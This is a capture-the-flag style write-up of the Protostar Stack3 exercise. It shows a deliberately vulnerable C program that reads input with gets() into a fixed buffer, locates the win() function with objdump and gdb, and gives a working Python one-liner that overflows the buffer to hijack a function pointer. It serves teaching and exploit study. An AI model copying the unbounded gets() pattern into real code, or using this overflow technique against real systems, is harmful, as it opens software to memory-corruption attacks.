# Protostar - Stack3
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack3__
* About

  Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

  Hints
    * both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}

```

  For this problem we have to find the address of win() function and overflow return address with that value.

  Let's find the address of win() function by using **objdump**
```
user@protostar:~$ objdump -d /opt/protostar/bin/stack3 | grep win
08048424 <win>:
```

or by using **gdb**

```
user@protostar:~$ gdb /opt/protostar/bin/stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) print win
$1 = {void (void)} 0x8048424 <win>
```

  The address is **0x8048424**

  Now we have to know exactly how many bytes the buffer has.

  The buffer has 64 bytes followed by  4 bytes of fp variable, if we overflow the fp variable with the address of win() the program will jump to win()
  

### _Solution_
```
user@protostar:~$ python -c 'print("A"*64 + "\x24\x84\x04\x08")' | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```